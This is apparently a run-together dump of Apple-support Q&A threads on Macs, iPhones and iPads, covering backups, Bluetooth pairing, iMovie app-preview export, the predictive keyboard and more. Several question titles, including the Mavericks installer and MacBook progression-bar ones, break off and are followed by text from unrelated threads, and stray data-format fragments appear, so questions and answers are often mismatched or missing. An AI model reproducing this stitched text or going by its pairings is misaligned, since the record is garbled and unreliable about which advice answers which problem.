You can Get Info on a folder, say Documents, and drag any icon to replace the generic one.\nThe reason you lost the \"special icons\" in your home folder is that /User/yourusername/.DS_Store file is corrupted/missing/read-only/others. Dot-DS-dash-Store is a hidden file where all the metadata about the folder is stored. It's the reason why if you can return to a folder with icons, sorting order, positions, and other preferences just like the way you left it.\nWhen you install OS or create a new user home folder, an appropriate .DS_Store is created.

I have an iPad Mini that doesn't charge anymore because the lightning cable stopped working. Since the warranty is over, I can't get a free replacement. I don't really feel like buying a new lightning cable because they're expensive AND STILL fragile. I thought about buying one of those cheaper, generic lightning cables, but some of them are not compatible with iOS 7, and the rest state that they work only with iOS 7. With iOS 8 coming out later this month, I don't think those would work after the update anyway.\nNow, I know Apple makes Lightning-to-MicroUSB connectors. I like the idea of that, I have a few Micro-USB cables lying around that are sturdy and NOT fragile, so I could use one of those with the connector. I think this would last me way longer than another lightning cable. My questions are: \n\n\n*\n\n*Why do the generic lightning cables specify iOS version compatibility and why aren't they readily compatible with all iOS versions? Is it because they lack the authentication chip inside?\n\n*If I buy this adapter - is it guaranteed to work with iOS 8? Is it universally compatible with ALL iOS versions and does it have an authentication chip inside?\n\n\nA: For your first question, fake cable manufacturers are probably aiming for lots of sales, and explicitly stating that it only works up to a certain OS version would turn many people away. (the original cable doesn't have a version limit, so this one seems weird, I'm not buying that)\nFor your second question yes, this adapter has the useless authentication chip/whatever crap in it, and since the micro-USB standard (fortunately) doesn't have any of that nasty stuff you can plug in any cable from any charger and it'll work assuming the charger itself is good.\n", "Q: Mac OS X Mavericks Setup file Retrieve Is there any possibility of getting the OS X Mavericks installation file after OS X Mavericks is installed?

So we have a setup like this: \n\n\n*\n\n*His MacBook Pro with 1TB, about 30% used.\n\n*Her MacBook Air with 256GB, about 30% used.\n\n*USB2 drive with 2 x 2TB configured as RAID-1 ('mirrored for safety'), about 80% used, contains 300GB family photos, 700GB family videos, 400GB music, 200GB document archives, etc. This is most often connected to (1) when archiving or doing family event video editing.\n\n*His and hers iPhones, we infrequently back them up to (1) and (2).\n\n*TimeCapsule 3GB, currently backs up (1) and (2) but not (3)\n\n\nAll seemed good.\nThen, one day, the USB drive wouldn't start up.\nAfter cold sweats of panic, we opened the USB drive. Luckily, this is a model where you can pop open the top and pull out a drive. One of the drives inside has died. Due to the RAID-1 configuration, the other drive worked just fine, so all our data is safe.\nThat was too close - losing all the family photos, videos, scans of important documents, etc, would be catastrophic for us. \nWe accept that with normal usage; the drive(s) inside the USB enclosure were going to wear out at some point, so this isn't a problem with the product - although I'd think twice about buying a passively-cooled device again as manipulating gigabytes of video files is going to keep it warm for some time and heat causes equipment like this to fail quicker.\nSo we'll likely replace the USB drive with something suitable in the next week o so.\n...but we're now really keen to incorporate some kind of secondary backup so that we don't have this panic again.\nWe've looked at 'cloud drive' types of solution, but they seem to presume that the entire backup will fit onto one computer - which it won't. We also don't need all our photos, videos, etc, to be fully sync'd - just be able to retrieve it if everything goes south with the USB drive.\nSo, putting aside costs for the moment, what are our secondary backup options?\n\nUPDATE\nI should've been clearer - the USB RAID drive is only sometimes connected. Backing up ~2TB to the cloud will take a very long time (2TB @ 2mb/second ADSL upload = 102 days according to http://www.databarracks.com/support/bandwidth-calculator/) which would tie up his or hers laptop for that whole time.\nCan we connect the USB drive to the TimeCapsule and it upload to a cloud backup provider?\n\nA: More than a 'cloud drive' solution, you should be looking for a 'cloud backup' solution. Backblaze and Crashplan are popular options, but there are a variety of possibilities with different features , such as Arq or Tarsnap.\nA bootable copy of your main drives would be an additional insurance against disaster; you can use a software like SuperDuper! or Carbon Copy Cloner.\n\nA: I would approach this as follows:\nFirst, identify what you need to back up. Things like important documents and photos, of  course, but not things like OSX cache files. For example, with few exceptions you can ignore most system files so long as you're willing to rebuild your machine from scratch. Also, some things don't change that much (like music perhaps) and some are covered by cloud storage you may get with your device (e.g. iCloud with your iPhones)\nThat said, it is probably wise to have full image copies of both MacBook boot drives so that in an emergency you can \"roll back\" to a point in time. If you're like most people you would need these back relatively quickly.\nTo support both of these I would do the following:\n\n\n*\n\n*Use Carbon Copy Cloner for rotating full image backups of both MacBook boot drives.  This will require at least 2 hard drives of at least 2 Tb each (more if you fill up your laptops). You can configure CCC so that it will just look at the drive name when it does the backup. That way you can call each drive the same name and not worry about which you're plugging in for the automatic backup. If you keep one drive in a safe deposit box and the other at home, switching them from time to time, you'll have two full backups of both laptops.\n\n*Get Crashplan (or a similar service; I love Crashplan though) for the 700 gig RAID and at least one of the MacBooks. Crashplan is CPU based, meaning that the basic cloud backup is for one CPU. More cost fractionally more per year. Crashplan will also let you backup to another Crashplan customer's drive for free (I haven't tried this).\n\n*I use Arq for more refined hourly backups of photos and important documents.  Arq has saved me several times. You can use Amazon's Glacier storage with Arq and it runs about $10 per terabyte per month. Recovery times from Glacier can be costly and time consuming if you attempt to recover a lot of data though. I use this primarily to recover a few files from time to time.\nThese three approaches should offer reasonable protection from someone stealing your laptops, robbing your house of all your hardware, and meteors. It emphasizes rapid recovery of what's on the laptops. 1 and 2 together will be comprehensive. 3 adds some convenience but is basically covered by 2.\nOne other thing to consider is data security. Arq encrypts data with a password it stores in your OSX keychain. Crashplan uses your login password, which they know obviously, and may also use a longer passphrase only you know. You can also fully encrypt the drives from (1). The idea is to protect yourself from the other side, namely anyone getting hold of your drives or accessing your data in the cloud.\n", "Q: Macbook Pro 15 progression bar halts then circle spins We have a Macbook Pro 15 Last 2011.

My folder action gets two Finder items: say 'foobar1.pdf' and 'foobar2.pdf' files, and copies them to another folder.\nIt works but there is a side-effect: also the auxiliary files with the same name but different filename extensions (.aux .nav .snm .toc and .out) were also copied.\nTo solve that I created another folder action to send 'foobar1.aux', 'foobar1.nav' and so on to the Trash. But to test it, I did not add 'foobar2.aux', 'foobar2.nav' and so on. The new script works—the files are send to the Trash but now there is a beneficial side-affect: the auxilary files for 'foobar2' are also deleted even if they were not included in the workflow.\nIs there a logical explanation for this behavior? Any way to avoid the side-effects?\n\n\n\nA: A Folder Action workflow will give you every file when a change is detected in the specified folder, including ones you are not interested in. \nYour problem is with Get Specified Finder Items. It just adds items to the list of files to process. It doesn't filter anything!\nUse the Filter Finder Items action instead to filter the list returned by Finder.

The trackball is plugged in via USB port. The ball is rather sensitive, so it picks up very small movement, like from vibration of the desk.\nSo when I put my computer to sleep, quite often it wakes up from that movement. Sometimes I'm not even sure there is any movement. The computer just enters the sleep mode, I barely even breathe, and several seconds after the power indicator starts blinking it powers up again.\nWhen I unplug the trackball, everything works fine.\nSo, is there a way to disable waking Mac from a particular USB device? If not, from USB entirely? Or maybe only pointing device movement (clicks would be alright)?\n\nA: From a quick google it seems you are out of luck.\nThe basic reasoning is that you (normally) would want to wake from key or mouse press, and if these are connected via USB then the mac needs to detect activity on the USB, and rather than distinguish between clicks and movements it wakes on both.\nMost of apples own mice are bluetooth, and mac os x has an option within the system preferences not to wake mac on bluetooth (either disable on move and click or just movement, I forget which). \nCan you pull out the trackball's ball?

I mean...why they fold it like this? it's just too stupid.\nThanks for any advice!\n\nA: You don't have to do anything. The cable is made of a couple layers of isolation warped around copper. Each material has its own elasticity and there is friction where the materials meet. The metal inside the cable is not irreversibly bent. It's the friction that's keeping it this way.

So I am debating on charging the itouch through my laptop. But I am worried I may damage it.

How do I make it stop? I can't download any apps.\n\nA: Apple's servers were very overloaded with the iPhone 6 preorders.\n\n\n*\n\n*http://www.apple.com/support/systemstatus/\nThe official system status page for Apple shows that things have cleared up, so most people with problems installing or downloading things can reboot their devices and then try again to get proper download and purchase behavior.\nExpect some slowness this next Wednesday the 17th through Friday the 19th of September with iOS 8 coming out and iPhone 6 being delivered and activated. iCloud backups and restores should be slower than normal as well as possible store and purchase / AppleID slowness if the authentication servers come under large strain again.\nIn the short term, you could pause the download or turn off your networking and then sign out of the store. At that point, rebooting and trying again - waiting longer between attempts is a good first attempt. Also, Apple does support users on store download issues - so if you've waited several hours/days, contacting store support might be a next step.\n\nA: Try Signing out & back in to the Store - from Store menu.\nI've seen it happen on iPhones but not a Mac; but that was the cure on the phone.\nI've also heard that the Store was having problems due to the volume of people trying to pre-order the iPhone 6 - so maybe just wait it out if you can let things settle for an hour or a day.\n\nA: It appears that the Apple Store is having problems.\nUsing the http://istheapplestoredown.com/ shows it to be online, but they had some recent problems with the flood of iPhone 6 pre orders and had to take it down on Thursday.

Does anyone know how long Photo Booth can record video with iSight camera on Mac? I want to record for a few days non stop, and don't know if that's possible even if there is sufficient space in HD? I'm using OS X 10.6.\n\nA: Your HD storage space is the limiting factor\nThere is no reasonable limit to the file size of Photo Booth video's. Photo Booth stores video's with AAC audio and H.264 video compression.\nVideo will take the most storage space. The H.264 uses a lossy video compression method. The amount of compression is usually defined by the amount of motion in your video. A tripod mounted camera recording of a vase with flowers will result in a smaller file size than a hand filmed recording of a flock of birds.\nSo your answer in short, your HD storage space is the limiting factor. Record for one hour and see how much space you needed for your type of video.\n\nIf you are only interested in 'changes in your scene', try another option, like senstic (the first google hit, nothing special)\n", "Q: Keep two Macports installations in sync I've got two Macs, an iMac and a Macbook Pro.

Google didn't show anything, is there any space recommended as a destination directory? Please indicate for both current user and all users.\n\nA: If you follow those instructions, the package will install everything to /usr/local. This is a recommended place to install user-compiled software because it's already in your PATH, doesn't need elevated permissions, and a lot of stuff breaks if it's not in either /usr or /usr/local . If you open the DEST directory that's created before the pkgutil step, you'll see where everything gets installed. It's the --PREFIX=/usr/local in the configure step that decides the path relative to which things get installed.\nIncidentally, both those packages can be found in homebrew which, in my opinion, is a better way to manage these things and you may find more straightforward. After you install homebrew:\nbrew install szip hdf5\n\n", "Q: Where May I (legally) get a Mac OS X .iso File to Virtualize OS X? I want to virtualize a Mac (the latest, 10.9) on my Mac (MacBook Air).

I can see it running on my activity monitor, but I don't see the icon anymore (even after restarting the computer)\n\nA: As others have explained the menu space is limited.\nBut you may not need a couple of the ones you have in there so you could try and remove them to see if that gives you the room.\nExpressCard ,Timemachine, Bluetooth,Keyboard input.\nSince they are Menu Extras  you can hold down the cmd  key, click each menu item and drag away from the menu bar and release them to puff away.\nOr use the items preferences to do the same.( not sure the ExpressCard has one)\n\n\nA: AccessMenuBar solves that problem.\n\nA: It is possible to use BetterTouchTool for that purpose. For example:\n\n\nA: *\n\n*Finder has a relatively short app menu, so activating Finder is a quick way to see more menu bar icons.  (And the built-in Maps app has an even shorter app menu.)\n\n*Bartender collapses the menu bar items into a submenu, which will let you see more of them (without being hidden by app menus).\n\n\n\n\nA: App menus take precedence over menu bar items. In this case, whatever your foreground app is, it's menu options are too long, causing Window and Help to hide the menu bar items that would otherwise occupy that space. To see more menu bar items, use an app with a shorter menu list, or increase your screen resolution.\n", "Q: Programs take a long time to load after startup After turning on my computer, logging in, and waiting for the desktop to load, I try to start a program. It takes a really long time to load, no matter which program I try. After about a minute of the icon bouncing stupidly up and down it finally opens. From then on programs start much more quickly. Why is that?\n\nA: How many items are there on the desktop? How much RAM does your machine has?

So I was playing around with the iOS 8, when I notice that upon typing \"new\" anywhere, the predictive keyboard suggests the term \"NewTerm\". I recall using this word in a tweet, so I brushed it off. But then, when writing the word \"swift\", the keyboard suggested \"Swisslapse\" upon having written \"swi\". Now this shocked me quite a bit, as I have only used the term \"Swisslapse\" in a private iMessage chat, which had been deleted three months back (from all my devices). I tried typing a few other words that I had used recently in Safari (running in private mode), but to my relief the keyboard did not suggest them.\nHowever, this creates a couple of questions:\n\n\n*\n\n*Does Apple cache my iMessage chats?\n\n*Does Apple cache my keyboard input in selected apps?\n\n*Is it possible to request a purge of my caches?\n\n*How can I disable further caching (if any).\n\n\nI think it would be helpful to add that I had installed iOS 8 on the 9th of September, right after the GM seed was released to the developer center. Therefore it is impossible for iOS 8's predictive keyboard to have learnt these words at time of input.\n\nBased on the answer provided by Brian Nickel, iOS added the words to my local keyboard dictionary (i.e. words I want autocorrect to learn), which I then synced to iOS 8 while restoring my device from a backup; which resulted into the predictive keyboard suggesting them when seemingly necessary.\nSo it seems that Apple isn't infringing upon our privacy after all. Glad to have that cleared up!\n\nA: If you read the Apple patents there is a explanation how it works.\nUS patents\nPatent No. 8,232,973 for a \"Method, device, and graphical user interface providing word recommendations for text input\"\nand \nApple’s U.S Patent No. 8,074,172 for a \"method, system, and graphical user interface for providing word recommendations\" or predictive text.\n\n…..However, the size of these portable communication devices also\n  restricts the size of the text input device, such as a physical or\n  virtual keyboard, in the portable device. With a size-restricted\n  keyboard, designers are often forced to make the keys smaller or\n  overload the keys. Both may lead to typing mistakes and thus more\n  backtracking to correct the mistakes. This makes the process of\n  communication by text on the devices inefficient and reduces user\n  satisfaction with such portable communication devices.  \n.....The set of strings are compared against a dictionary. Words in the\n  dictionary that have any of the set of strings as a prefix are\n  identified (206). As used herein, \"prefix\" means that the string is a\n  prefix of a word in the dictionary or is itself a word in the\n  dictionary. A dictionary, as used herein, refers to a list of words.\n  The dictionary may be pre-made and stored in the memory. The\n  dictionary may also include usage frequency rankings for each word in\n  the dictionary. A usage frequency ranking for a word indicates (or\n  more generally, corresponds to) the statistical usage frequency for\n  that word in a language. In some embodiments, the dictionary may\n  include different usage frequency rankings for different variants of a\n  language. For example, a dictionary of words in the English language\n  may have different usage frequency rankings with respect to American\n  English and British English.  \nIn some embodiments, the dictionary may be customizable. That is,\n  additional words may be added to the dictionary by the user.\n  Furthermore, in some embodiments, different applications may have\n  different dictionaries with different words and usage frequency\n  rankings. For example, an email application and an SMS application may\n  have different dictionaries, with different words and perhaps\n  different usage frequency rankings within the same language. \nThe identified words are the candidate words that may be presented to\n  the user as recommended replacements for the input sequence. The\n  candidate words are scored (208). Each candidate word is scored based\n  on a character-to-character comparison with the input sequence and\n  optionally other factors. Further details regarding the scoring of\n  candidate words are described below, in relation to FIGS. 3 and 7A-7C.\n  A subset of the candidate words are selected based on predefined\n  criteria (210) and the selected subset is presented to the user (212).\n  In some embodiments, the selected candidate words are presented to the\n  user as a horizontal listing of words.\n\nGraphical view:\n\nI did not intend to provide a complete explanation on how it works, but provide a guide to it.\nSo what about \n\nNotice my dictionary does not have it so it is red underlined and it is recommending to look it up.\nThe choices are:\n1- look it up and correct\n2- add to dictionary as typed\n3- ignore it\nThe predictive keyboard logic will take in account all 3 inputs. Even the ignored version, and it will assume it is what I wanted. So in your case, you probably did not add it to your dictionary, but used that word more than once, so it became marked as the most probable (predictive).\n\nA: Speaking only from my experience with iOS 7, the device saves any words you enter but don't autocorrect into your \"Keyboard dictionary\".  The logic is that if you didn't want to correct it, it is a word that you have used and may use again.\nI did a basic test.  I typed \"Swisslapse\" into Messages but did not send.  After a while I typed \"Swiss\" and it came up in autocomplete.  I confirmed it came up in Notes too.  To verify it wasn't Apple app specific I typed a new word into Avocado and it also showed up as a completion suggestion in Notes.\nYou can clear out your keyboard dictionary by going into Settings.app, General > Reset > Reset Keyboard Dictionary.  This answer shows the path to the cache and you could theoretically remove just the offending words using a third-party tool to access and modify the file.\nAs for preventing new words from being learnt, I would speculate that disabling Auto-Correction would do the trick in iOS 7.  Even though \"Swisslapse\" is an autocomplete suggestion now, it still shows up as an invalid word so it is not interacting with the spell check dictionary.  iOS 8 may have more fine grained settings but you have to assume that the predictive keyboard is learning from everything you type and may have to just disable it.\nTo your question on iMessages, Apple is adamant that they cannot read your messages in transit as they are encrypted on the sender's device only to be read on the receiver's device(s).  I would doubt that Apple saves the message contents on device if you delete it there.  I haven't tested, but I would doubt they also scan incoming messages for words to autocorrect, though they have started scanning them for predictive text responses. (E.g., \"Pizza or Chinese?\" generates Pizza and Chinese as the first two predictive responses.)\n", "Q: Asinine message preventing me from installing Xcode on 10.9.4 Every time I try to install Xcode from within the Mac App Store, I get \"Download for free?

It has extra buttons that you can assign macros to, for instance I assigned the 'move left/right a space' to two of the buttons, which the keys are listed in Mission Control on system preferences. However, I also want to assign the 'Swipe between pages' trackpad function, whereby I swipe left and right, however I cannot find the keys that enable me to do this and hence cannot define a macro for the mouse. \nWhat are the keys-equivalent of swiping between pages?\n\nA: There is no universal shortcut. In Safari, two finger swipe functions as Back-/Forward (CMD + ←|→). In Preview, it's Left/Right Page (←|→). Using keyboard shortcuts doesn't give you the nice transitional effects.\nYou can use BetterTouchTool. It allows you to bind mouse buttons to keyboard shortcuts, either globally or on per-app basis.\n", "Q: How to connect bluetooth magic mouse and keyboard on thunderbolt display, if they don't show up? I used a thunderbolt cable to connect my Macbook and iMac.\nPressed cmd+f2 on my iMac and the displays works perfectly.\nBut I cannot use my bluetooth mouse and keyboard to control the Macbook.It cannot find the mouse or any other device.\n\nHow should I pair those peripherals?\n\nA: Your iMac is acts as a screen only, not as a bluetooth hub. You need to pair your devices to your main laptop only, and get a cheap keyboard for your iMac who's only purpose will be to kick it in target display mode as you described.\nTo re-pair Apple input devices: \nMouse / Magic Trackpad: hold \"clicked\" while turning on 10- 15 seconds\nBT keyboard: hold power for 15 seconds.\n\nA: Make sure it doesn't think it's currently paired & in use by another machine. Power down any other devices it could possibly be connected to.\nTake the batteries out, put them back in; check the green light is flashing.\nTurn the MacBook's bluetooth off & on again.\nRepeat in varying order until it gets the idea.\nSo long as you have a non-bluetooth keyboard [built-in] you won't get stuck in the 'can't switch bluetooth back on' scenario.\n\nA: Frustratingly, Apple bluetooth peripherals can only be paired with one Mac. If a device is already paired with a different Mac, they will not even show as pairing options on a different Mac. This makes it appear as if they are not working, but in fact, they are working as designed.\nIf you have your mouse and keyboard paired with your iMac, and then attached the Macbook to your iMac screen via Thunderbolt, the mouse and keyboard will NOT be available to your Macbook. This is because they are already paired with your iMac. Additionally, in order for your iMac screen to support the Macbook, the iMac is actually running, even though the screen does not show the iMac (its being used to support your Macbook). \nIf your iMac is running, if you take out the batteries of your mouse and keyboard, they will reconnect to the iMac when they power back up. To prevent this, you must click on the Bluetooth icon in your iMac menu bar, and disconnect the mouse and keyboard, then set both in pairing mode so that they can be identified by your Macbook. And you must do this in reverse if you want your iMac to use them again. Every.Single.Time.\nObviously, this ease of use feature works against you here. My suggestion is to get dedicated mouse and keyboard for the iMac and Macbook, perhaps even wired devices for the iMac or a Magic Mouse for the iMac and a TrackPad for the MacBook.\nBut for a simpler solution (at the time of this writing), look beyond Apple. Logitech solves this issue with their 'Easy-Switch' devices, that allows simple bluetooth switching. The Logitech K811 keyboard will switch from one Mac to another, and even an iPad with a click of a button. The newer K480 does as well, and is more of a desktop keyboard. Likewise, their Ultrathin Touch Mouse T630 has similar switching capability.\n\nA: Here's the solution that worked for me (YMMV):\n\n\n*\n\n*Turn off bluetooth\n\n*Reboot your mac\n\n*Put your bluetooth devices in \"discoverable\" mode\n\n*Turn bluetooth back on\n\n\nYou should be able to see / connect to your devices in System Preferences > Bluetooth now.\n", "Q: Does memory size increase the weight of the iPhone 6 Plus? Are the 16, 32 and 64GB models the same weight or does increased memory increase the weight?\n\nA: As a general answer normally an increase in memory capacity of that order won't have a significant effect on weight. I'm not sure exactly what memory chips Apple use in the iPhone 6 Plus but 16GB is in the realm where a single chip can be used. As an example a TSSOP-56 package is pretty common for FLASH memory  and if you read a typical Package Material Disclosure the total maximum weight is 221 milligrams each.\nIf they added an additional three and you allowed a little extra for solder it would still come in under a gram. So when Apple don't list a seperate weight based on memory capacity they probably either use higher density FLASH or don't consider the weight significant enough to list.\n\nA: According to Apple the iPhone 6 Plus weights 6.07 ounces (172 grams). There is no mention of weight differences depending on memory size.\n\nA: My iphones do feel like larger memory is significantly heavier. We have iphone 6 64GB and 128GB. We also just got iphone 7 plus 128GB and 256GB.\nI'm surprised why no one reports this difference in weight.(I just spent an hour googling this, so many iphone reviews and discussions but nothing about this issue.. I just don't get it why my wife's phone is lighter..)  \n", "Q: Keyboard maestro: Defining \"if app active\" macros In Keyboard Maestro, is there any way to define a macro that is triggered when two conditions are true?\n\n\n*\n\n*A certain application is active (i.e. on focus)\n\n*A hot key is activated (i.e. I press a key)\n\n\nI have tried adding conditions, but they are interpreted with an OR and not with an AND.\nBelow is an example of what I tried:\n        \n\nA: To define Keyboard Maestro macros only active in specific applications you need to define a new Macro Group (left most column in the Keyboard Maestro Editor) and select the application(s) on group level.\n\n", "Q: How can I send/receive files from my iPhone over Bluetooth to my Mac?

It didn't import my Contacts for some reason, so I used the old laptop to send everything to iCloud, then reimported it to the new computer. That gave me all the cards, but I have two new errors: \n1) Birthday notifications are shown excessively. I close them and a few minutes later I get another one. This is both the day before and day of the birthday.\n2) When in FaceTime, initially I can see all the contacts I have available, but after I click on one, and then go back to All Contacts, I have a list of \"no name\" only.\nBoth of these errors, I think, would stem from the contacts app itself. iCloud seems to be involved - I suspect every time iCloud is pinged for updates, I get the birthday notification re-displaying. So I tried to restore the Contacts list to see if that would help, but I can't - when I try to open a saved .abbu, nothing happens. If I try to import just one vCard, nothing happens. I can delete the whole Contacts list, shut off iCloud, but still nothing happens when I try to reimport. \nWhen I first set up the laptop, I also had an error 513 which would crash Mail, which I eventually found was because the permissions were wrong on Containers/com.apple.mail... in the ByHost folder, so I couldn't edit the files in there. I thought maybe the same was happening with Contacts, where it just wouldn't update my contacts because it wasn't allowed. But in the ByHost folder, all I have are 2 alias files which are trying to point to files in the same folder, but they don't exist. I tried deleting the aliases to force Contacts to make new files, and it just makes new aliases which still point to non-existent files. I tried to check the Time Machine backup but it looks like there were only ever the two aliases in that folder, no valid files.\nCompletely turning off iCloud and then restarting it also didn't help.\nAny ideas? I have no clue at this point why I can't get my Contacts to import an abbu, whether or not iCloud is on. Which means I still haven't figured out why FaceTime is buggy and I get excessive birthday notifications.\n\nA: Unfortunately, once Yosemite was installed, even Finder wouldn't open. I had to travel to the nearest Apple Store where even the Mac Genius was pretty stumped. His best guess was the build of Mavericks was corrupt on the new laptop to begin with, or the build number was invalid for some reason. It's not clear why that didn't fix itself when Yosemite was installed.\nIn short, the only solution was to do a full backup, completely wipe the system (completely - there was no data on the SSD at that point), reinstall Mavericks, upgrade to Yosemite, then copy the files from the backup without restoring any settings or preferences, and then set up each program individually from scratch.\n", "Q: How to sync one or two labels only, from Gmail to Mail.app?

And by nothing I mean, no fan spinning, no lights, no hard-drive POST-ing. \nCould anyone give me a hint to as what is wrong with my Mac.\nMy idea is\n-3.6 Volt  battery is dead\n-Power supply is shot\nALSO, I do not have a keyboard or mouse connected, but I do not think that, that would cause the fan to no start.\nAny help or suggestions would be fantastic.Thanks all!\n\nA: Our \"Cousin\" has a number of good suggestions.\nThe \"BIOS\" which is just the firmware of the machine and not strictly speaking a BIOS needs to be there and non-corrupt just like he said.\nYou do need a battery and it needs to be good, it won't boot without it. That is what I would replace first. Just pop it out of the machine and take it to a batteries+ store or some such near you. They can test it, if it's good there are other (potentially more serious) issues. If it is bad, buy a new one.\nOnce installed just try switching it on.\nIf it is STILL not working it could be a bad power supply or any one of a hundred (literally...) other things. And depending on how much money you want to spend and how good you are with a multi-meter and some Googling for sites with repair info, you might get it up and running.\nJUST ONE THING THOUGH It is very important to be very careful working in one of the all-in-one Macs with a built-in CRT like the Color Classic.\nThere will be a big red wire going into a rubber \"boot\" attached to the back side of the CRT. Stay away from that, there can be enough residual voltage stored in that tube to kill you. And no I am not exaggerating or just trying to scare you. Stay away from that wire, especially where it connects to the tube and the other end in the power supply. I have worked on a lot of old style all-in-one Macs and you can safely work in them. Just be careful and stay far away from that wire.\nIf a new battery did not do the trick, I would disassemble it: Motherboard, drives, RAM, etc. (but stay away from the high voltage power supply and the big red wire.

Both types of links make it possible to acces the same folder from different locations.\nDropbox will treat each folder (original or linked) as an original folder on your system, as if it is the only folder with that content. Dropbox will not know if a folder is a symbolic link or not.\nModifications to the content of a linked folder will change the contents of that original folder. As I said, dropbox will treat that folder as any original 'normal' folder, so changing the content within dropbox will change the original.\nIn short. On each system there is only 1 original folder. You can create as many links as you like, the content of that folder only lives once on your system. Altering the content on any location (e.g. dropbox) will change the content of that original folder.\n", "Q: Apple said we can use iMovie to make App Previews, but I can't export the correct size using iMovie I'm trying to create an App Preview for an iPhone app.\nI recorded a screen capture of the app in the native resolution of the phone.\nThen I imported the video in iMovie and used iMovie to add transitions and text, and to arrange the clips.\nAccording to Apple, App Previews should be 640x1136 for the iPhone 5 portrait size, but the export menu doesn't support this size or any custom sizes.\nApple said we could use iMovie, but this doesn't seem to work. How can I change the export size? \n\nA: If like me and the OP you did all of the work to create your preview only to find that you can't 'share' it as a preview because you did not start it as a preview then here is the answer.\nStart a 'New App Preview' then open your original project -> click in the timeline and select all (cmd + a) -> copy that (cmd + C) -> go to your empty app preview -> click in the timeline and -> paste (cmd + V).\nAll your hard work is now in the app preview video.\n\nA: It may be possible to use some other software to crop and re-encode the output, but that would be a messy and troublesome process.\nInstead, the solution I came to is this:\n\n\n*\n\n*Download a trial of Final Cut Pro from Apple. \n\n*Export your movie to Final Cut Pro using these instructions.\nI had some trouble on this step (the menu option was grayed out, initially), but eventually resolved it by making sure all the clips were consolidated in the library.\n\n\n*In Final Cut Pro, modify the project settings to use the custom resolution:\n\n\n*Follow Apple's instructions for exporting App Previews with Final Cut Pro.\nI believe Apple made a mistake in recommending iMovie during WWDC. Actually, on the new App Preview documentation, they no longer mention iMovie. Perhaps some day they will update iMovie and add support for other export presets.\nIn the meantime, I would suggest either buying a Final Cut Pro license or using video editing software other than iMovie. \n\nA: Here is how to do it for low cost and really fast.  \n\n\n*\n\n*Record just one demo from the iPhone 6 plus.  \n\n*Edit it in iMovie as an App Preview project.\n\n*Export it as a ProRes file\n\n\nYou now have your high quality master from which you will produce all other formats, without having to record more demos on other devices and edit them all over again, which is horribly time consuming.\nOn the Apple Store buy and download QuickTime 7 PRO for just 30 dollars.  This is the seventh marvel in the video world and a very well kept secret: it's cheap and will convert to almost any format! Pro guys know this and use it all the time.\n\n\n*\n\n*Open your master in QT 7 Pro.\n\n*Select \"export as...\" Set it to MPEG-4 Video and press the \"Options...\" button.\n\n*Use Apple's \"App Preview Specifications\" to setup the export parameters. The trick when you export to the iPad Format is to check the \"Preserve proportions via Letterbox\" option\". This will add black bars on each side of your iPhone 6+ videos.\n\n\nUse your freed up time to make your app better!\n\nA: Make sure you go to File->New App Preview (available on iMovie 10.0.6 on Yosemite).\n\n\nA: For exporting:\nOnce you have created an App Preview project in iMovie (see kokernutz's answer) and finished your movie, you can export from the share menu as shown in this screenshot:\n\nFor some reason the app preview option only showed up when my focus was on the timeline (in other words, if you don't see it, click somewhere on the timeline for your project first).  You can obviously still use the File export to get the same results if you know the right settings (discussed in some of the other answers).\n\nA: Add an image to the beginning of the video, e.g. one second splash screen or 0.1 second black/white screen. Make sure the image dimensions match the intended device dimensions. Video added after the image will conform to these dimensions - you will have a resizer option in the preview video to change your video size to match the initial screen dimensions.\nYou can also remove the beginning image after all of this and your movie will retain the new size.\n\nA: I've encountered the same surprise. Here's a really easy solution:\nFrom within iMovie:\n\n\n*\n\n*Select Share from menu bar\n\n*Choose 'Export using Quicktime'\n\n\nOn 'Save Exported File as…' screen:\n\n\n*\n\n*Select 'OPTIONS' (which is toward the bottom of window beside 'Export: Movie to Quicktime')\n\n\nOn 'Movie Settings' window:\n\n\n*\n\n*Select Video Settings button\n\n*Be sure compression type = H.264\n\n*Change Frame Rate to = 30 fps\n\n*Make Compressor Quality = Best\n\n*Press OK to confirm\n\n\nBack on 'Movie Settings window:\n\n\n*\n\n*Select 'Size' button under Video section\n\n*On 'Export Size Settings' screen now\n\n*Select 'Dimensions' drop down\n\n*Scroll to bottom and choose 'CUSTOM'\n\n*You'll now have the option to input: 640 x 1136 (for iPhone 5 series dimensions)\n\n*Press OK, OK, then Save\n\n\nA: iMovie is able to export app previews. I just went through the process.\nOne downside to using iMovie for making an app preview is that the selection of titles is much more limited than in a regular movie.\nIn a couple weeks I will find out whether Apple accepts my preview.\nhttps://developer.apple.com/app-store/app-previews/imovie/Creating-App-Previews-with-iMovie.pdf\nUpdate: Apple accepted the iMovie-generated app preview.\n\nA: I'm using iMovie 10.0.6 on Yosemite. With this version there is an option \"New App Preview\" under the File menu. Just click on that to start creating your app preview.\nAs Josh Adams mentioned there are less title options but they are specific for app previews which is handy.\nI created my app preview and when clicking on the Share button, there is a new icon \"App Preview\" which will export the file in the required format. I was able to upload the file to iTunes Connect.\n\nA: I just did this for my App Preview created with iMovie. The solution is simple but iMovie does not make it obvious.\nAll you need to do is at the very beginning of your movie, add a static image that is the correct resolution that Apple is asking for. Here's a reference to those resolution requirements from Apple.\nThis will mean creating separate videos for each phone size. Fortunately, across all products there are only 3 screen resolutions (6 total for Portrait & Landscape).\nTo do this:\n\n\n*\n\n*Open iMove\n\n*Select File > New App Preview\n\n*Add the static image for your first phone size\n\n*Complete making your video\n\n*Make a second video by selecting File > New App Preview\n\n*Add the static image for your second phone size\n\n*Go back to your first video, select all elements of the video (except the first static image) and COPY\n\n*Go to your second video, and PASTE all of those elements after the static image\n\n\nThat's it! You can check that the video is being created at the correct resolution by clicking the \"Settings\" button to the top right of the Video Timeline. There is should give you a tooltip and at the top say \"App Preview - [YOUR VIDEO RESOLUTION]\"\nHope that helps!\n\nA: I hit this problem in mojave 10.14.2 on macbook pro.\nI wanted to make macOS Previews of size 1920x1080.\nTried to record the macbook screen, but after sharing the video, I ended up with 1136x640 dimensions.\nThe solution was \"simple\".

